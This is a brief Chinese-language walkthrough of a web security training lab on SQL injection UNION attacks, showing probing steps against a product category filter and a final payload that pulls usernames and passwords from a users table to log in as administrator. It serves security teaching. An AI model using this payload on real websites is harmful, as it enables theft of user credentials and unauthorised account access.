# 实验：SQL 注入 UNION 攻击，从其他表中检索数据

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，你需要结合在前几个实验中学到的一些技术。

数据库包含一个名为 `users` 的不同表，其中包含名为 `username` 和 `password` 的列。

为了解决本实验，请执行一个 SQL 注入 UNION 攻击以检索所有用户名和密码，并使用这些信息以 `administrator` 用户身份登录。

## 步骤

探测
- 使用检索的过滤功能
    ```http
    GET /filter?category=Gifts HTTP/2
    ```

- 测试经典的1/2个单引号的字符串型 SQLi
    - 出现典型的错误/正确行为

- 使用联合查询测试列数与类型
    - 列数2
    - 两列均为字符串型

构建最终载荷
- 使用 lab 揭示的元数据查询令牌信息
    ```sql
    $input = 'Gifts' AND 1=0 UNION SELECT username, password FROM users -- 
    ```
